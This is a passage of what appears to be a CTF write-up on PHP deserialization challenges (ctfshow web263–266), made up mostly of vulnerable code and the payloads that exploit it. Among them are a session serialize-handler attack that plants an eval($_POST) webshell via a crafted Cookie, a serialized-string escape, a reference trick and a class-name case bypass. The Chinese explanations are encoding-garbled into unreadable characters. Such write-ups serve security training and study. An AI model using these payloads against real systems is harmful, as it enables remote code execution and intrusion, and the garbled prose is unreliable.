class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"limit"</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>inc.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">setStatus</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">status</span><span class="token operator">=</span><span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"log-"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"‰ΩøÁî®"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">.</span><span class="token string double-quoted-string">"ÁôªÈôÜ"</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">status</span><span class="token operator">?</span><span class="token string double-quoted-string">"ÊàêÂäü"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Â§±Ë¥•"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"----"</span><span class="token operator">.</span><span class="token function">date_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d H:i:s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>inc.phpÊúâfile_put_contentsÔºåÂèØÂÜôÊú®È©¨ÔºåuserÊéßÂà∂Êñá‰ª∂ÂêçÔºåpassÂÜô‰∏ÄÂè•ËØù</p><pre class="language-php" data-language="php"><code class="language-php">session<span class="token operator">.</span>save_path<span class="token operator">=</span><span class="token string double-quoted-string">""</span> ÊåáÂÆöÂÇ®Â≠òÁöÑË∑ØÂæÑsession<span class="token operator">.</span>save_handler<span class="token operator">=</span><span class="token string double-quoted-string">""</span> ÊåáÂÆöÂÇ®Â≠òÊó∂‰ΩøÁî®ÁöÑÂáΩÊï∞ÔºàÈªòËÆ§ÊòØfileÔºâsession<span class="token operator">.</span>auto_start boolensession<span class="token operator">.</span>serialize_handler<span class="token operator">=</span><span class="token string double-quoted-string">""</span> ÂÆö‰πâÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÁöÑÂ§ÑÁêÜÂô®ÁöÑÂêçÂ≠óÔºåÈªòËÆ§ÊòØ<span class="token function">php</span><span class="token punctuation">(</span><span class="token number">5.5</span><span class="token number">.4</span>ÂêéÊîπ‰∏∫php_serialize<span class="token punctuation">)</span></code></pre><p>‰ΩøÁî® <code>ini_set</code> ÊåáÂÆö‰∫Ü <code>serialize_handler</code> ‰∏∫ <code>php</code>ÔºåÂ¶ÇÊûúÈªòËÆ§ÁöÑ <code>serialize_handler</code> ‰∏∫ <code>php_serialize</code>ÔºåÂ∞±ÂèØ‰ª•ÈÄöËøáÂú®Â∫èÂàóÂåñÁöÑÂ≠óÁ¨¶‰∏≤‰πãÂâçÂä† <code>|</code>ÔºåÂèçÂ∫èÂàóÂåñ‰ªªÊÑèÂØπË±°„ÄÇ</p><ul><li><p>php_binary: Â≠òÂÇ®ÊñπÂºèÊòØÔºåÈîÆÂêçÁöÑÈïøÂ∫¶ÂØπÂ∫îÁöÑASCIIÂ≠óÁ¨¶+ÈîÆÂêç+ÁªèËøáserialize()ÂáΩÊï∞Â∫èÂàóÂåñÂ§ÑÁêÜÁöÑÂÄº</p></li><li><p>php: Â≠òÂÇ®ÊñπÂºèÊòØÔºåÈîÆÂêç+Á´ñÁ∫ø+ÁªèËøáserialize()ÂáΩÊï∞Â∫èÂàóÂ§ÑÁêÜÁöÑÂÄº</p></li><li><p>php_serialize(php&gt;5.5.4): Â≠òÂÇ®ÊñπÂºèÊòØÔºåÁªèËøáserialize()ÂáΩÊï∞Â∫èÂàóÂåñÂ§ÑÁêÜÁöÑÂÄº,‰ºöÂ∞ÜÈîÆÂêçÂíåÂÄºÂΩì‰Ωú‰∏Ä‰∏™Êï∞ÁªÑÂ∫èÂàóÂåñ</p><blockquote><p>Ê≥®ÊÑèÔºöÂú® <code>php 5.5.4</code> ‰ª•ÂâçÈªòËÆ§ÈÄâÊã©ÁöÑÊòØ <code>php</code>Ôºå<code>5.5.4</code> ‰πãÂêéÂ∞±ÊòØ <code>php_serialize</code>ÔºåËøôÈáåÁöÑ <code>php</code> ÁâàÊú¨‰∏∫ <code>7.3.11</code>ÔºåÈÇ£‰πàÈªòËÆ§Â∞±ÊòØ <code>php_serialize</code>„ÄÇ</p></blockquote></li></ul><p>ÈÇ£‰πàÊÄùË∑ØÂ∞±ÂæàÊ∏ÖÊô∞‰∫ÜÔºåÈ¶ñÂÖàÂú®index.php‰∏≠ÁöÑ <code>$COOKIE[&#39;limit&#39;]</code> ‰∏≠ÊûÑÈÄ† <code>|+Â∫èÂàóÂåñÂØπË±°</code> ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåËÆøÈóÆÈ¶ñÈ°µÂÜôÂÖ• <code>session</code>ÔºåÂÜçÈÄöËøá <code>check.php</code> Âä†ËΩΩÁöÑ <code>inc.php</code> ‰∏≠ÁöÑ <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> Â∞Ü <code>session</code> ‰ª• <code>session.serialize_handler=php</code> ÁöÑÊ†ºÂºèÂèçÂ∫èÂàóÂåñÔºåÊâßË°å <code>User</code> Á±ªÁöÑ <code>__destruct</code> ÊñπÊ≥ïÂÜô <code>shell</code>„ÄÇ<br>ÊûÑÈÄ† <code>payload</code>Ôºö</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php eval($_POST[1]);phpinfo();?>'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiJhLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</span></span></code></pre><p>ËÆøÈóÆindex.phpÊó∂‰øÆÊîπCookieÂπ∂ÂèëÈÄÅÔºåÁÑ∂ÂêéËÆøÈóÆcheck.phpËß¶ÂèëÂèçÂ∫èÂàóÂåñÔºåÊúÄÂêéÂú®Ê†πÁõÆÂΩï‰∏ã<code>/log-a.php</code>ÂàöÂºÄÂßãÊñá‰ª∂ÊàêÂäüÂÜôÂÖ•‰∫ÜÔºåÊ≤°Ê≥ïÂëΩ‰ª§ÊâßË°åÔºåÊú®È©¨ÂêéÈù¢Âä†‰∏™<code>phpinfo()</code>Â∞±ÂèØ‰ª•‰∫ÜÔºåÂæàÂ•áÊÄ™</p><h4 id="web264-SessionÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶ÈÄÉÈÄ∏"><a href="#web264-SessionÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶ÈÄÉÈÄ∏" class="headerlink" title="web264(SessionÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶ÈÄÉÈÄ∏)"></a>web264(SessionÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶ÈÄÉÈÄ∏)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ËøôÊ¨°Áõ∏ÊØî <code>web262</code> Êúâ‰∫Ü <code>session</code> ÁöÑÈôêÂà∂ÔºåÂ∞±‰∏çËÉΩËá™Â∑±ÊûÑÈÄ†‰∫ÜÔºåÁî®Ëµ∑Êù•ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏„ÄÇ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span> <span class="token operator">=</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";&#125;'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>f<span class="token operator">=</span>aaa<span class="token operator">&amp;</span>m<span class="token operator">=</span>bbb<span class="token operator">&amp;</span>t<span class="token operator">=</span>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="token string double-quoted-string">";s:5:"</span>token<span class="token string double-quoted-string">";s:5:"</span>admin"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Âú®Âêëindex.phpÂèëÈÄÅ‰πãÂêéÂæóÂà∞ÂõûÊòæYour message has been sentÔºåÁÑ∂ÂêéËÆøÈóÆmessage.phpÔºàËÆ∞ÂæóCookieÂä†‰∏ämsgÔºâÂæóÂà∞flag</p><h4 id="web265-ÂºïÁî®"><a href="#web265-ÂºïÁî®" class="headerlink" title="web265(ÂºïÁî® &amp;)"></a>web265(ÂºïÁî® &amp;)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowAdmin</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctfshow</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>Â¶ÇÊûúË¶ÅÈù†ËæìÂÖ•ÁöÑ <code>$password</code> ÂéªÂíå <code>md5(mt_rand())</code> Á¢∞ÊíûÔºåÂá†‰πéÊòØ‰∏çÂèØËÉΩÁöÑ„ÄÇËøôÈáåÈúÄË¶ÅÁî®Âà∞ <code>php</code> ÁöÑÂºïÁî®Ôºå‰ΩøÂæó <code>$password = </code></p><p><code>&amp;$token;</code>ÔºåÈÇ£‰πà <code>$password === $token</code> Â∞±Ê≤°ÈóÆÈ¢ò‰∫Ü„ÄÇ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowAdmin</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token operator">&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshowAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">PayloadÔºö<span class="token operator">?</span>ctfshow<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A12<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfshowAdmin<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>token<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BR<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web266-PHPÂ§ßÂ∞èÂÜô"><a href="#web266-PHPÂ§ßÂ∞èÂÜô" class="headerlink" title="web266( PHPÂ§ßÂ∞èÂÜô)"></a>web266( PHPÂ§ßÂ∞èÂÜô)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cs</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctfshowo</span><span class="token operator">=</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cs</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$cs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error <span class="token interpolation"><span class="token variable">$ctfshowo</span></span>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong><a href="https://blog.csdn.net/qq_41445224/article/details/88890323">file_get_contents(‚Äòphp:&#x2F;&#x2F;input‚Äô)</a></strong></p><p>Âú®Áî®phpÂÜôÊé•Âè£ÁöÑÊó∂ÂÄôÔºåÈÄöÂ∏∏‰ºöÂ∞ÜËØ∑Ê±ÇÁöÑÊï∞ÊçÆÈÄöËøájsonÁöÑÂΩ¢ÂºèÂèëÈÄÅÂà∞ÊåáÂÆöÁöÑËØ∑Ê±ÇÂú∞ÂùÄÂ§ÑÔºåÊ≠§Êó∂ÁöÑfile_get_contents(‚Äòphp:&#x2F;&#x2F;input‚Äô)<br>‰∏ªË¶ÅÊòØÁî®Êù•Ëé∑ÂèñËØ∑Ê±ÇÁöÑÂéüÂßãÊï∞ÊçÆ</p><p>ÂÖ∂‰∏éPOSTÁöÑÂå∫Âà´Â¶Ç‰∏ãÔºö</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token variable">$_POST</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span>‚Äúname‚Äù<span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> ‚Äúzhangsan‚Äù <span class="token punctuation">[</span>‚Äúpwd‚Äù<span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> ‚Äúzhangsan‚Äù <span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>php<span class="token punctuation">:</span><span class="token comment">//input-------------</span>name<span class="token operator">=</span>zhangsan<span class="token operator">&amp;</span>pwd<span class="token operator">=</span>zhangsan</code></pre><p>Âè™Ë¶ÅÂ∫èÂàóÂåñctfshowÁ±ªËÆ©‰ªñÂèçÂ∫èÂàó‰πãÂêéËß¶Âèë__destruct()ÂáΩÊï∞Âç≥ÂèØÂæóÂà∞flag</p><p>Áî±‰∫éËøáÊª§‰∫Ü<code>ctfshow</code>‰ΩÜÊòØËøôÈáåÁî®ÁöÑÊòØ<code>cTFSHOW</code>ÔºåÂú®PHP‰∏≠ÔºåÁ±ª‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜôÔºõÊâÄ‰ª•ÁªïËøá‰∫ÜËøáÊª§„ÄÇ</p><p>ËøôÈáåÊ∂âÂèäÂà∞‰∏Ä‰∏™ <code>php</code> Â∏∏ËØÜÔºö<a href="https://www.cnblogs.com/zrp2013/p/3607581.html">PHPÂ§ßÂ∞èÂÜôÔºöÂáΩÊï∞ÂêçÂíåÁ±ªÂêç‰∏çÂå∫ÂàÜ,ÂèòÈáèÂêçÂå∫ÂàÜ</a>„ÄÇ</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cTFSHOW"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xxxxxx"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xxxxxx"</span><span class="token punctuation">;</span><span class="token 